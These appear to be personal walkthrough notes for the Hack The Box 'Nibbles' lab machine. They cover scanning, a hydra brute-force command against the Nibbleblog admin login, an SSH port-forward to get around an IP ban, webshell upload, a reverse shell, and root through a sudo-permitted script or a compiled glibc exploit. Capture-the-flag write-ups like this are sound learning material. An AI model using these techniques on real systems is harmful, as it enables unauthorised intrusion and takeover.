https://app.hackthebox.com/machines/Nibbles

https://www.youtube.com/watch?v=s_0GcRGv6Ds

```sh
mkdir ~/HTB-Machines/nibbles
```

```sh
nmap -sC -sV -oA nmap/initial 10.10.10.75
```

Port 80 open -> open website -> turn on intercept and refresh -> repeater and gather info from request

- Apache 2.4.18
- Ubuntu
- /nibbleblog directory
- Powered by Nibbleblog -> research this -> download the tool to learn how to enumerate
- Move the file into working directory, unzip and do recursive grep to find version in the files
```sh
grep -R 4.0.5 . | awk -F: '{print $1}' | uniq # searches for '4.0.5' inside files in the current directory, then separates at string ': 4.0.5', and lists unique entries (if the file is repeated in the output, prints only once)
```

Open the file and confirm the version.
Open the file on the website and view source. It's a PHP script but it's not executed since the file has `.bit` extension instead of `.php`.
Get the version and look for an exploit using `searchsploit`
```sh
# Version 4.0.3
searchsploit nibbleblog
# 2 exploits
# Copy the exploit to working dir with mirror option (-m)
mkdir exploits && cd exploits
searchsploit -m exploits/php/remote/38489.pb
searchsploit -m exploits/php/webapps/35865.txt
less 35865.txt # exploit is for version 3.0, remove it
rm 35865.txt
less 38489.pb # version 4.0.3, look at blogpost in the exploit to find out how it works
```

Poke around with the known files and directories (from the downloaded zip).
Discover Update endpoint which exposes additional directories and files.
Exposes `username`, try to bruteforce with `hydra`, use a smaller `rockyou` wordlist.

```sh
hydra -l admin -P rockyou-50.txt http://10.10.10.75 http-post-req "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
# intercept in Burp to get post params
```

The server blacklisted the IP.
**Don't run hydra against web apps unless you can confirm there is NOT a blacklist / ban system in place.**

Proxy from another web server on the same network (same network, different machine)

```sh
ssh -i ../../falafel/root.key -L9000:10.10.10.75:80 10.10.10.73
```

Go to `localhost:9000` to confirm port forward works.
Try to login and confirm if the blacklist updates with the other machine's IP.

\*Lucky guess admin password: `nibbles`
Do the exploit.
Upload a webshell and save request in Burp Suite in case of future modifications.
Visit the upload directory (shown in exploit explanation) and open the file.
Send to repeater to change the commands.
Obtain revshell from pentest monkey.
Run `which nc` to see if `nc` is installed.
Try first and last shell script, usually one works.
After obtaining shell, check if `python, python3` exists to get a stronger shell.
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo
fg
```
User obtained, grab flag and run some commands
```sh
ls
cd ~
ls
cat user.txt
sudo -l
```
Shows a script that can be run with sudo permissions, but the script doesn't exist so we should create it
```sh
mkdir -p personal/stuff # -p creates all directories in the chain
vim monitor.sh # add shebang
```
```sh
#!/bin/sh
bash
```
```sh
ls
chmod +x monitor.sh
sudo ./monitor.sh
# Root obtained
```

#### Second way of solving the lab

Download `linux-exploit-suggester`, serve the enumeration script.
Curl the script after obtaining user shell and run it.
Look at last exploit, it suggests based on `glibc:2.23-0ubuntu9`.
Run `ldd --version` to confirm the `glibc` version.
Run `cat /etc/lsb-release` to confirm the Ubuntu version.
Check `searchsploit rationallove`.
Search `rationallove poc`.
Copy the exploit to machine, `rationallove.c`.
Serve and download the exploit on the target.
Compile and run -> Root obtained.
Grab flag.